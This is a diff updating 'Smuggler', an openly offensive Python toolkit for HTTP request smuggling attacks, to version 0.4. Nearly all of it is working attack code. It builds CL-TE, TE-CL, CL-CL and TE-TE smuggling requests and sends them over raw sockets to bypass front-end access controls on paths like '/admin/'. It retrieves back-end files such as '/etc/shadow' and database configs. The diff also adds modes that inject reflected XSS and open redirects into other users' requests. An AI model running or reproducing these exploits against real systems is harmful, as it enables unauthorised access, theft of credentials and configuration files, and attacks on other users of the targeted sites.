@@ -1,7 +1,7 @@
 #!/usr/bin/env python3 
 # -*- coding: utf-8 -*-"
 """
-Smuggler (HTTP -Smuggling- Attack Toolkit) - 2020 - by psy (epsylon@riseup.net)
+Smuggler (HTTP -Smuggling- Attack Toolkit) - 2020/2022 - by psy (epsylon@riseup.net)
 
 You should have received a copy of the GNU General Public License along
 with PandeMaths; if not, write to the Free Software Foundation, Inc., 51
@@ -9,8 +9,8 @@ Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 """
 import sys, socket, ssl
 
-VERSION = "v:0.3beta"
-RELEASE = "28042020"
+VERSION = "v:0.4"
+RELEASE = "09122022"
 SOURCE1 = "https://code.03c8.net/epsylon/smuggler"
 SOURCE2 = "https://github.com/epsylon/smuggler"
 CONTACT = "epsylon@riseup.net - (https://03c8.net)"
@@ -49,50 +49,62 @@ def set_target():
             print("\n[Error] Method is invalid: '"+str(method)+"'\n")
             print("-"*45)
             sys.exit()
+    protocol = input("\n  + Enter PROTOCOL (default: 'HTTP/1.1'): ")
+    if protocol == "":
+        protocol = "HTTP/1.1"
     path = input("\n  + Enter PATH (default: '/'): ")
     if path == "":
         path = "/"
-    return target, port, SSL, method, path
+    cookie = input("\n  + Enter COOKIE (ex: 'session=iLxgKt7w3FIKor1csjB5HYbPrq9evRhb;'): ")
+    return target, port, SSL, method, protocol, path, cookie
 
 def detect(final): # detect menu
-    target, port, SSL, method, path = set_target() # set target
+    target, port, SSL, method, protocol, path, cookie = set_target() # set target
     print("\n"+"="*50 + "\n")
     print("[Info] Starting -HTTP Smuggling- Timing detection ...")
     payloads_dsync = payloads.payloads.payloads # load payloads
+    if target.endswith("/"):
+        target = target.replace("/", "")
     addr = (target, port)
     print("")
     for payload in payloads_dsync:
         attack_type = payload.split("#")[0]
         payload_type = payload.split("#")[1]
-        print("="*50)
-        print("Trying payload: ["+str(attack_type)+"]")
-        print("="*50+"\n")
-        payload = method+" "+path+" HTTP/1.1\r\nHost: "+target+"\r\n"+payload_type # main smuggling payload
-        print("+ PAYLOAD:\n")
-        print(payload)
-        send_payload(attack_type, payload, addr, SSL) # send each payload
+        for i in range(0,2): # send payload twice
+            print("="*50)
+            print("Trying payload: ["+str(attack_type)+"] ["+str(i+1)+"/2]")
+            print("="*50+"\n")
+            if cookie is not "":
+                payload = method+" "+path+" "+protocol+"\r\nHost: "+target+"\r\nCookie: "+cookie+"\r\n"+payload_type # main smuggling payload + cookie
+            else:
+                payload = method+" "+path+" "+protocol+"\r\nHost: "+target+"\r\n"+payload_type # main smuggling payload
+            print("+ PAYLOAD:\n")
+            print(payload)
+            send_payload(attack_type, payload, addr, SSL) # send each payload
     if final == True:
-        show_final_results(target, port, method, path, final)
+        show_final_results(target, port, protocol, method, path, final)
     else:
-        t, p, m, pt = show_final_results(target, port, method, path, final)
-        return t, p, m, pt, SSL
+        t, p, pr, m, pt = show_final_results(target, port, protocol, method, path, final)
+        return t, p, pr, m, pt, SSL
 
 def send_payload(attack_type, payload, addr, SSL):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     if SSL == True: # ssl
-        ss = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_SSLv23)
+        ss = ssl.wrap_socket(s)
     try:
         if SSL == True: # ssl
             ss.connect(addr)
         else:
             s.connect(addr)
-    except:
+    except Exception as e:
         print("-"*45)
         print("[Error] Generating socket... -> [PASSING!]")
+        print(e)
         print("-"*45+"\n")
-        s.close()
         if SSL == True: # ssl
             ss.close()
+        else:
+            s.close()
         return
     for i in range(0,10): # x10 tests
         if SSL == True: # ssl
@@ -113,11 +125,12 @@ def send_payload(attack_type, payload, addr, SSL):
             pass
     print("\n+ REPLY:\n")
     print(str(datas))
+    print("")
     resp_c=0
     resp=""
     wait=False
     for line in datas.split('\n'):
-        if "502" in line or "501" in line or "404" in line or "405" in line:
+        if "502" in line or "501" in line or "404" in line or "405" in line or "403" in line or "400" in line:
             wait=False
             resp_c+=1
         else:
@@ -125,22 +138,25 @@ def send_payload(attack_type, payload, addr, SSL):
         if not wait:
             resp += line+'\n'
     print("-"*45)
-    if resp_c > 0 and "not supported for current URL" in str(datas):
+    if resp_c > 0 and "Unrecognized method" in str(datas) or resp_c > 0 and "not supported for current URL" in str(datas):
         print ("PAYLOAD: ["+str(attack_type)+"] is WORKING! ;-)")
-        VULNERABLE_LIST.append(attack_type) # add attack type for results
+        if attack_type not in VULNERABLE_LIST:
+            VULNERABLE_LIST.append(attack_type) # add attack type for results
     else:
         print ("PAYLOAD: ["+str(attack_type)+"] is NOT working...")
     print("-"*45+"\n")
-    s.close()
     if SSL == True: # ssl
         ss.close()
+    else:
+        s.close()
 
-def show_final_results(target, port, method, path, final):
+def show_final_results(target, port, protocol, method, path, final):
     print("="*50)
     print("\n+ Detection RESULT: -HTTP Smuggling- Timing Attack\n")
     print("-"*45+"\n")
     print("  - TARGET: "+str(target)+":"+str(port))
     print("  - Method: "+str(method))
+    print("  - Protocol: "+str(protocol))
     print("  - Path  : "+str(path))
     TETE = False
     TECL = False
@@ -158,7 +174,7 @@ def show_final_results(target, port, method, path, final):
             elif v.startswith("CL-TE") and CLTE == False: # CL-TE
                 print("    * [CL-TE]: [Front-end: Content-Length] <-> [Back-end: Transfer-Encoding]")
                 CLTE = True
-            else:
+            elif v.startswith("CL-CL") and CLCL == False: # CL-CL
                 print("    * [CL-CL]: [Front-end: Content-Length] <-> [Back-end: Content-Length]")
                 CLCL = True
     else:
@@ -166,11 +182,11 @@ def show_final_results(target, port, method, path, final):
         print("\n"+"="*50+"\n")
         sys.exit() # exit when not vulnerable!
     if final == False: # keep exploiting
-        return target, port, method, path
+        return target, port, protocol, method, path
     print("\n"+"="*50+"\n")
 
 def exploit(): # exploit menu
-    exploit = input("\n+ SELECT EXPLOIT:\n\n  (0) Verify Injection (Back-End)\n  (1) Reveal Rewriting (Front-End)\n  (2) Bypass ACLs (Front-End)\n  (3) Fetch Files (Back-End)\n\n")
+    exploit = input("\n+ SELECT EXPLOIT:\n\n  [0] SMG-VER-01: VERIFY that your 'chunked' requests are arriving correctly\n  [1] SMG-REV-01: REVEAL if the front-end performs some REWRITING of requests before they are forwarded to the back-end\n  [2] SMG-ACL-01: GRANT ACCESS to a RESTRICTED URL (ex: '/restricted/salaries/boss.php', '/admin/', '/private/messages' ...)\n  [3] SMG-GET-01: GET a FILE from the back-end server (ex: '/etc/shadow', '/server/config_db.php' ...)\n  [4] SMG-XSS-01: INJECT a (simple) reflected XSS in the back-end (exploit 'User-Agent', 'Referer' vulnerability) and append it to the next user's request\n  [5] SMG-UFO-01: TURN an 'on-site' redirect into an OPEN REDIRECT and append it to the next user's request\n\n")
     if exploit == "0": # verify acccess (back-end)
         exploit_verify()
     elif exploit == "1": # reveal (front-end)
@@ -179,26 +195,33 @@ def exploit(): # exploit menu
         exploit_bypass()
     elif exploit == "3": # fetch files (back-end)
         exploit_steal()
+    elif exploit == "4": # reflected XSS (back-end)
+        exploit_XSS()
+    elif exploit == "5": # open redirect (back-end)
+        exploit_openredirect()
+
     else: # exit
         print ("[Info] Not any valid exploit selected... -> [EXITING!]\n")
         sys.exit()
 
-def send_exploit(addr, SSL, exploit, exploit_type):
+def send_exploit(addr, SSL, exploit, exploit_type, exploit_mode):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     if SSL == True: # ssl
-        ss = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_SSLv23)
+        ss = ssl.wrap_socket(s)
     try:
         if SSL == True: # ssl
             ss.connect(addr)
         else:
             s.connect(addr)
-    except:
-        print("\n"+"-"*45)
+    except Exception as e:
+        print("-"*45)
         print("[Error] Generating socket... -> [PASSING!]")
+        print(e)
         print("-"*45+"\n")
-        s.close()
         if SSL == True: # ssl
             ss.close()
+        else:
+            s.close()
         return
     for i in range(0,2): # send exploit twice
         if SSL == True: # ssl
@@ -217,20 +240,21 @@ def send_exploit(addr, SSL, exploit, exploit_type):
             datas += str(data.decode('utf-8'))
         except:
             pass
+    print("\n"+"-"*45)
     print("\n+ REPLY:\n")
     print(str(datas))
-    if exploit_type == "VERIFY":
+    if exploit_mode == "VERIFY":
         print("\n"+"-"*45)
-        print("\n[Info] Congratulations!!! ;-)\n\n Your 'chunked' requests have arrived correctly: \n")
-        if "YPOST  not supported for current URL" in str(datas):
-            print("  -> Invalid HTTP method: 'YPOST' (not supported)\n")
-        elif "YGET  not supported for current URL" in str(datas):
-            print("  -> Invalid HTTP method: 'YGET' (not supported)\n")
+        print("\n[Info] This exploit ["+exploit_type+"] is working!!! ;-) \n")
+    if SSL == True: # ssl
+        ss.close()
+    else:
+        s.close()
 
 def exploit_verify():
     print("\n"+"="*50 + "\n")
-    print("[Info] Trying to verify injections (generating Back-End errors)...")
-    target, port, method, path, SSL = detect(False) # set target
+    print("[Info] Trying to VERIFY injections (generating back-end errors)...")
+    target, port, protocol, method, path, SSL = detect(False) # set target
     addr = (target, port)
     print("\n"+"-"*45)
     exploits_dsync = payloads.payloads.exploits # load exploits
@@ -242,27 +266,62 @@ def exploit_verify():
                     if s.split("#")[0] == "0": # verify reading
                         s = s.replace("$method", method)
                         s = s.replace("$path", path)
+                        s = s.replace("$protocol", protocol)
                         s = s.replace("$target", target)
                         smuggled = s.split("#")[1].replace("\n","")
                 exploit = exp.split("#")[1]
                 exploit = exploit.replace("$method", method)
                 exploit = exploit.replace("$path", path)
+                exploit = exploit.replace("$protocol", protocol)
                 exploit = exploit.replace("$target", target)
-                content_length = len(smuggled)-1
+                exploit_type = str(exp.split("#")[0])
+                content_length2 = ""
+                if exploit_type == "CL-TE-0":
+                    content_length = len(smuggled)+5 #CL-TE-0
+                elif exploit_type == "CL-TE-1":
+                    content_length = len(smuggled)+4 #CL-TE-1
+                elif exploit_type == "CL-CL-0":
+                    content_length = len(smuggled)-1 #CL-CL-0
+                elif exploit_type == "CL-CL-1":
+                    content_length = len(smuggled)-1 #CL-CL-1
+                    content_length2 = len(smuggled)-1
+                    exploit = exploit.replace("$LC", str(content_length2))
+                elif exploit_type == "CL-CL-2":
+                    content_length = len(smuggled)-1 #CL-CL-2
+                    content_length2 = len(smuggled)+1
+                    exploit = exploit.replace("$LC", str(content_length2))
+                elif exploit_type == "TE-CL-0":
+                    content_length = len(smuggled)+3 #TE-CL-0
+                elif exploit_type == "TE-CL-1":
+                    content_length = len(smuggled)+2 #TE-CL-1
+                elif exploit_type == "TE-TE-0":
+                    content_length = len(smuggled)-1 #TE-TE-0
+                    content_length2 = len(smuggled)-1
+                    exploit = exploit.replace("$LC", str(content_length2))
+                elif exploit_type == "TE-TE-1":
+                    content_length = len(smuggled)-1 #TE-TE-1
+                    content_length2 = len(smuggled)+1
+                elif exploit_type == "TE-TE-2":
+                    content_length = len(smuggled)-1 #TE-TE-2
+                    content_length2 = len(smuggled)+1
                 exploit = exploit.replace("$CL", str(content_length))
                 exploit = exploit.replace("$SMUGGLED", smuggled)
-                print("\n"+"="*50+"\n")
-                print("+ PAYLOAD MODE: ["+str(exp.split("#")[0])+"] \n")
+                print("="*50+"\n")
+                print("+ PAYLOAD TYPE: ["+exploit_type+"]")
+                print("+ EXPLOIT CODE:\n")
                 print(str(exploit))
-                send_exploit(addr, SSL, exploit, "VERIFY") # send expoit
+                send_exploit(addr, SSL, exploit, exploit_type, "VERIFY") # send exploit
 
 def exploit_reveal():
     print("\n"+"="*50 + "\n")
-    print("[Info] Trying to reveal Front-End rewriting...")
-    target, port, method, path, SSL = detect(False) # set target
+    print("[Info] Trying to REVEAL front-end REWRITING...")
+    target, port, protocol, method, path, SSL = detect(False) # set target
     addr = (target, port)
     print("\n"+"-"*45)
-    parameter = input("\n  + Enter PARAMETER reflected (ex: 'q', '_username', ...): ")
+    print("\n"+"="*50)
+    print("[Info] Exploiting front-end REWRITING...")
+    print("="*50)
+    parameter = input("\n  + Enter PARAMETER (ex: 'q', '_username', 'search' ...): ")
     exploits_dsync = payloads.payloads.exploits # load exploits
     smuggled_method = payloads.payloads.methods # load methods
     for v in VULNERABLE_LIST:
@@ -272,31 +331,66 @@ def exploit_reveal():
                     if s.split("#")[0] == "1": # reveal rewriting
                         s = s.replace("$method", method)
                         s = s.replace("$path", path)
+                        s = s.replace("$protocol", protocol)
                         s = s.replace("$target", target)
                         s = s.replace("$parameter", parameter)
                         content_length = len(parameter)+2+50
                         s = s.replace("$CL", str(content_length))
                         smuggled = s.split("#")[1]
+                        s = s.replace("$SMUGGLED", smuggled)
                 exploit = exp.split("#")[1]
                 exploit = exploit.replace("$method", method)
                 exploit = exploit.replace("$path", path)
+                exploit = exploit.replace("$protocol", protocol)
                 exploit = exploit.replace("$target", target)
                 exploit = exploit.replace("$parameter", parameter)
-                content_length = len(smuggled)
+                exploit = exploit.replace("$SMUGGLED", smuggled)
+                exploit_type = str(exp.split("#")[0])
+                content_length2 = ""
+                if exploit_type == "CL-TE-0":
+                    content_length = len(smuggled)+5 #CL-TE-0
+                elif exploit_type == "CL-TE-1":
+                    content_length = len(smuggled)+4 #CL-TE-1
+                elif exploit_type == "CL-CL-0":
+                    content_length = len(smuggled)-1 #CL-CL-0
+                elif exploit_type == "CL-CL-1":
+                    content_length = len(smuggled)-1 #CL-CL-1
+                    content_length2 = len(smuggled)-1
+                    exploit = exploit.replace("$LC", str(content_length2))
+                elif exploit_type == "CL-CL-2":
+                    content_length = len(smuggled)-1 #CL-CL-2
+                    content_length2 = len(smuggled)+1
+                    exploit = exploit.replace("$LC", str(content_length2))
+                elif exploit_type == "TE-CL-0":
+                    content_length = len(smuggled)+3 #TE-CL-0
+                elif exploit_type == "TE-CL-1":
+                    content_length = len(smuggled)+2 #TE-CL-1
+                elif exploit_type == "TE-TE-0":
+                    content_length = len(smuggled)-1 #TE-TE-0
+                    content_length2 = len(smuggled)-1
+                    exploit = exploit.replace("$LC", str(content_length2))
+                elif exploit_type == "TE-TE-1":
+                    content_length = len(smuggled)-1 #TE-TE-1
+                    content_length2 = len(smuggled)+1
+                elif exploit_type == "TE-TE-2":
+                    content_length = len(smuggled)-1 #TE-TE-2
+                    content_length2 = len(smuggled)+1
                 exploit = exploit.replace("$CL", str(content_length))
                 exploit = exploit.replace("$SMUGGLED", smuggled)
                 print("\n"+"="*50+"\n")
-                print("+ PAYLOAD MODE: ["+str(exp.split("#")[0])+"] \n")
+                print("+ PAYLOAD TYPE: ["+exploit_type+"]")
+                print("+ EXPLOIT CODE:\n")
                 print(str(exploit))
-                send_exploit(addr, SSL, exploit, "REVEAL") # send expoit
+                send_exploit(addr, SSL, exploit, exploit_type, "REVEAL") # send exploit
 
 def exploit_bypass():
     print("\n"+"="*50 + "\n")
-    print("[Info] Trying to bypass Front-End ACLs...")
-    target, port, method, path, SSL = detect(False) # set target
+    print("[Info] Trying to REVEAL front-end REWRITING...")
+    target, port, protocol, method, path, SSL = detect(False) # set target
     addr = (target, port)
     print("\n"+"-"*45)
-    restricted = input("\n  + Enter RESTRICTED ZONE (ex: '/admin', /wp-admin/, ...): ")
+    print("\n"+"="*50)
+    restricted = input("\n  + Enter RESTRICTED ZONE (ex: '/restricted/salaries/boss.php', '/wp-admin/', '/private/messages'...): ")
     exploits_dsync = payloads.payloads.exploits # load exploits
     smuggled_method = payloads.payloads.methods # load methods
     for v in VULNERABLE_LIST:
@@ -306,6 +400,7 @@ def exploit_bypass():
                     if s.split("#")[0] == "2": # bypass ACLs
                         s = s.replace("$method", method)
                         s = s.replace("$path", path)
+                        s = s.replace("$protocol", protocol)
                         s = s.replace("$target", target)
                         s = s.replace("$restricted", restricted)
                         content_length = 10 # $CL method
@@ -314,23 +409,54 @@ def exploit_bypass():
                 exploit = exp.split("#")[1]
                 exploit = exploit.replace("$method", method)
                 exploit = exploit.replace("$path", path)
+                exploit = exploit.replace("$protocol", protocol)
                 exploit = exploit.replace("$target", target)
                 exploit = exploit.replace("$restricted", restricted)
-                content_length = len(smuggled)
+                exploit_type = str(exp.split("#")[0])
+                content_length2 = ""
+                if exploit_type == "CL-TE-0":
+                    content_length = len(smuggled)+5 #CL-TE-0
+                elif exploit_type == "CL-TE-1":
+                    content_length = len(smuggled)+4 #CL-TE-1
+                elif exploit_type == "CL-CL-0":
+                    content_length = len(smuggled)-1 #CL-CL-0
+                elif exploit_type == "CL-CL-1":
+                    content_length = len(smuggled)-1 #CL-CL-1
+                    content_length2 = len(smuggled)-1
+                    exploit = exploit.replace("$LC", str(content_length2))
+                elif exploit_type == "CL-CL-2":
+                    content_length = len(smuggled)-1 #CL-CL-2
+                    content_length2 = len(smuggled)+1
+                    exploit = exploit.replace("$LC", str(content_length2))
+                elif exploit_type == "TE-CL-0":
+                    content_length = len(smuggled)+3 #TE-CL-0
+                elif exploit_type == "TE-CL-1":
+                    content_length = len(smuggled)+2 #TE-CL-1
+                elif exploit_type == "TE-TE-0":
+                    content_length = len(smuggled)-1 #TE-TE-0
+                    content_length2 = len(smuggled)-1
+                    exploit = exploit.replace("$LC", str(content_length2))
+                elif exploit_type == "TE-TE-1":
+                    content_length = len(smuggled)-1 #TE-TE-1
+                    content_length2 = len(smuggled)+1
+                elif exploit_type == "TE-TE-2":
+                    content_length = len(smuggled)-1 #TE-TE-2
+                    content_length2 = len(smuggled)+1
                 exploit = exploit.replace("$CL", str(content_length))
                 exploit = exploit.replace("$SMUGGLED", smuggled)
                 print("\n"+"="*50+"\n")
-                print("+ PAYLOAD MODE: ["+str(exp.split("#")[0])+"] \n")
+                print("+ PAYLOAD TYPE: ["+exploit_type+"]")
+                print("+ EXPLOIT CODE:\n")
                 print(str(exploit))
-                send_exploit(addr, SSL, exploit, "BYPASS") # send expoit
+                send_exploit(addr, SSL, exploit, exploit_type, "BYPASS") # send exploit
 
 def exploit_steal():
     print("\n"+"="*50 + "\n")
-    print("[Info] Trying to fetch files (via Back-End) from server...")
-    target, port, method, path, SSL = detect(False) # set target
+    print("[Info] Trying to GET FILE from server...")
+    target, port, protocol, method, path, SSL = detect(False) # set target
     addr = (target, port)
     print("\n"+"-"*45)
-    files = input("\n  + Enter FILE (ex: '/etc/passwd', '/server/config_db.php', ...): ")
+    files = input("\n  + Enter FILE (ex: '/etc/shadow', '/server/config_db.php' ...): ")
     exploits_dsync = payloads.payloads.exploits # load exploits
     smuggled_method = payloads.payloads.methods # load methods
     for v in VULNERABLE_LIST:
@@ -340,6 +466,7 @@ def exploit_steal():
                     if s.split("#")[0] == "3": # fetch files
                         s = s.replace("$method", method)
                         s = s.replace("$path", path)
+                        s = s.replace("$protocol", protocol)
                         s = s.replace("$target", target)
                         s = s.replace("$files", files)
                         content_length = len(files)+2 # p=len(files)
@@ -348,15 +475,181 @@ def exploit_steal():
                 exploit = exp.split("#")[1]
                 exploit = exploit.replace("$method", method)
                 exploit = exploit.replace("$path", path)
+                exploit = exploit.replace("$protocol", protocol)
                 exploit = exploit.replace("$target", target)
                 exploit = exploit.replace("$files", files)
-                content_length = len(smuggled)
+                exploit_type = str(exp.split("#")[0])
+                content_length2 = ""
+                if exploit_type == "CL-TE-0":
+                    content_length = len(smuggled)+5 #CL-TE-0
+                elif exploit_type == "CL-TE-1":
+                    content_length = len(smuggled)+4 #CL-TE-1
+                elif exploit_type == "CL-CL-0":
+                    content_length = len(smuggled)-1 #CL-CL-0
+                elif exploit_type == "CL-CL-1":
+                    content_length = len(smuggled)-1 #CL-CL-1
+                    content_length2 = len(smuggled)-1
+                    exploit = exploit.replace("$LC", str(content_length2))
+                elif exploit_type == "CL-CL-2":
+                    content_length = len(smuggled)-1 #CL-CL-2
+                    content_length2 = len(smuggled)+1
+                    exploit = exploit.replace("$LC", str(content_length2))
+                elif exploit_type == "TE-CL-0":
+                    content_length = len(smuggled)+3 #TE-CL-0
+                elif exploit_type == "TE-CL-1":
+                    content_length = len(smuggled)+2 #TE-CL-1
+                elif exploit_type == "TE-TE-0":
+                    content_length = len(smuggled)-1 #TE-TE-0
+                    content_length2 = len(smuggled)-1
+                    exploit = exploit.replace("$LC", str(content_length2))
+                elif exploit_type == "TE-TE-1":
+                    content_length = len(smuggled)-1 #TE-TE-1
+                    content_length2 = len(smuggled)+1
+                elif exploit_type == "TE-TE-2":
+                    content_length = len(smuggled)-1 #TE-TE-2
+                    content_length2 = len(smuggled)+1
                 exploit = exploit.replace("$CL", str(content_length))
                 exploit = exploit.replace("$SMUGGLED", smuggled)
                 print("\n"+"="*50+"\n")
-                print("+ PAYLOAD MODE: ["+str(exp.split("#")[0])+"] \n")
+                print("+ PAYLOAD TYPE: ["+exploit_type+"]")
+                print("+ EXPLOIT CODE:\n")
                 print(str(exploit))
-                send_exploit(addr, SSL, exploit, "STEAL") # send expoit
+                send_exploit(addr, SSL, exploit, exploit_type, "STEAL") # send exploit
+
+def exploit_XSS():
+    print("\n"+"="*50 + "\n")
+    print("[Info] Trying to EXPLOIT a (simple) reflected XSS in the back-end (User-Agent, Referer)...")
+    target, port, protocol, method, path, SSL = detect(False) # set target
+    addr = (target, port)
+    print("\n"+"-"*45)
+    text = input("\n  + Enter TEXT (ex: 'XSS', '0wNed by ANONYMOUS', ...): ")
+    exploits_dsync = payloads.payloads.exploits # load exploits
+    smuggled_method = payloads.payloads.methods # load methods
+    for v in VULNERABLE_LIST:
+        for exp in exploits_dsync:
+            if exp.split("#")[0] in v:
+                for s in smuggled_method:
+                    if s.split("#")[0] == "4": # reflected XSS
+                        s = s.replace("$method", method)
+                        s = s.replace("$path", path)
+                        s = s.replace("$protocol", protocol)
+                        s = s.replace("$target", target)
+                        s = s.replace("$text", text)
+                        content_length = len(text)-1
+                        s = s.replace("$CL", str(content_length))
+                        smuggled = s.split("#")[1]
+                exploit = exp.split("#")[1]
+                exploit = exploit.replace("$method", method)
+                exploit = exploit.replace("$path", path)
+                exploit = exploit.replace("$protocol", protocol)
+                exploit = exploit.replace("$target", target)
+                exploit = exploit.replace("$text", text)
+                exploit_type = str(exp.split("#")[0])
+                content_length2 = ""
+                if exploit_type == "CL-TE-0":
+                    content_length = len(smuggled)+5 #CL-TE-0
+                elif exploit_type == "CL-TE-1":
+                    content_length = len(smuggled)+4 #CL-TE-1
+                elif exploit_type == "CL-CL-0":
+                    content_length = len(smuggled)-1 #CL-CL-0
+                elif exploit_type == "CL-CL-1":
+                    content_length = len(smuggled)-1 #CL-CL-1
+                    content_length2 = len(smuggled)-1
+                    exploit = exploit.replace("$LC", str(content_length2))
+                elif exploit_type == "CL-CL-2":
+                    content_length = len(smuggled)-1 #CL-CL-2
+                    content_length2 = len(smuggled)+1
+                    exploit = exploit.replace("$LC", str(content_length2))
+                elif exploit_type == "TE-CL-0":
+                    content_length = len(smuggled)+3 #TE-CL-0
+                elif exploit_type == "TE-CL-1":
+                    content_length = len(smuggled)+2 #TE-CL-1
+                elif exploit_type == "TE-TE-0":
+                    content_length = len(smuggled)-1 #TE-TE-0
+                    content_length2 = len(smuggled)-1
+                    exploit = exploit.replace("$LC", str(content_length2))
+                elif exploit_type == "TE-TE-1":
+                    content_length = len(smuggled)-1 #TE-TE-1
+                    content_length2 = len(smuggled)+1
+                elif exploit_type == "TE-TE-2":
+                    content_length = len(smuggled)-1 #TE-TE-2
+                    content_length2 = len(smuggled)+1
+                exploit = exploit.replace("$CL", str(content_length))
+                exploit = exploit.replace("$SMUGGLED", smuggled)
+                print("\n"+"="*50+"\n")
+                print("+ PAYLOAD TYPE: ["+exploit_type+"]")
+                print("+ EXPLOIT CODE:\n")
+                print(str(exploit))
+                send_exploit(addr, SSL, exploit, exploit_type, "XSS") # send exploit
+
+def exploit_openredirect():
+    print("\n"+"="*50 + "\n")
+    print("[Info] Trying to turn an 'on-site' redirect into an OPEN REDIRECT...")
+    target, port, protocol, method, path, SSL = detect(False) # set target
+    addr = (target, port)
+    print("\n"+"-"*45)
+    path2 = input("\n  + Enter 'on-site' URL (ex: '/', '/login', '/restricted', ...): ")
+    redirect = input("\n  + Enter URL to redirect (ex: 'attacker-website.com' ...): ")
+    exploits_dsync = payloads.payloads.exploits # load exploits
+    smuggled_method = payloads.payloads.methods # load methods
+    for v in VULNERABLE_LIST:
+        for exp in exploits_dsync:
+            if exp.split("#")[0] in v:
+                for s in smuggled_method:
+                    if s.split("#")[0] == "5": # open redirect
+                        s = s.replace("$method", method)
+                        s = s.replace("$path", path)
+                        s = s.replace("$protocol", protocol)
+                        s = s.replace("$target", target)
+                        s = s.replace("$redirect", redirect)
+                        s = s.replace("$PT", path2)
+                        content_length = len(redirect)+1
+                        s = s.replace("$CL", str(content_length))
+                        smuggled = s.split("#")[1]
+                exploit = exp.split("#")[1]
+                exploit = exploit.replace("$method", method)
+                exploit = exploit.replace("$path", path)
+                exploit = exploit.replace("$protocol", protocol)
+                exploit = exploit.replace("$target", target)
+                exploit = exploit.replace("$redirect", redirect)
+                exploit = exploit.replace("$PT", path2)
+                exploit_type = str(exp.split("#")[0])
+                content_length2 = ""
+                if exploit_type == "CL-TE-0":
+                    content_length = len(smuggled)+5 #CL-TE-0
+                elif exploit_type == "CL-TE-1":
+                    content_length = len(smuggled)+4 #CL-TE-1
+                elif exploit_type == "CL-CL-0":
+                    content_length = len(smuggled)-1 #CL-CL-0
+                elif exploit_type == "CL-CL-1":
+                    content_length = len(smuggled)-1 #CL-CL-1
+                    content_length2 = len(smuggled)-1
+                    exploit = exploit.replace("$LC", str(content_length2))
+                elif exploit_type == "CL-CL-2":
+                    content_length = len(smuggled)-1 #CL-CL-2
+                    content_length2 = len(smuggled)+1
+                    exploit = exploit.replace("$LC", str(content_length2))
+                elif exploit_type == "TE-CL-0":
+                    content_length = len(smuggled)+3 #TE-CL-0
+                elif exploit_type == "TE-CL-1":
+                    content_length = len(smuggled)+2 #TE-CL-1
+                elif exploit_type == "TE-TE-0":
+                    content_length = len(smuggled)-1 #TE-TE-0
+                    content_length2 = len(smuggled)-1
+                    exploit = exploit.replace("$LC", str(content_length2))
+                elif exploit_type == "TE-TE-1":
+                    content_length = len(smuggled)-1 #TE-TE-1
+                    content_length2 = len(smuggled)+1
+                elif exploit_type == "TE-TE-2":
+                    content_length = len(smuggled)-1 #TE-TE-2
+                    content_length2 = len(smuggled)+1
+                exploit = exploit.replace("$CL", str(content_length))
+                exploit = exploit.replace("$SMUGGLED", smuggled)
+                print("\n"+"="*50+"\n")
+                print("+ PAYLOAD TYPE: ["+exploit_type+"]")
+                print("+ EXPLOIT CODE:\n")
+                print(str(exploit))
+                send_exploit(addr, SSL, exploit, exploit_type, "REDIRECT") # send exploit
 
 def print_banner():
     print("\n"+"="*50)
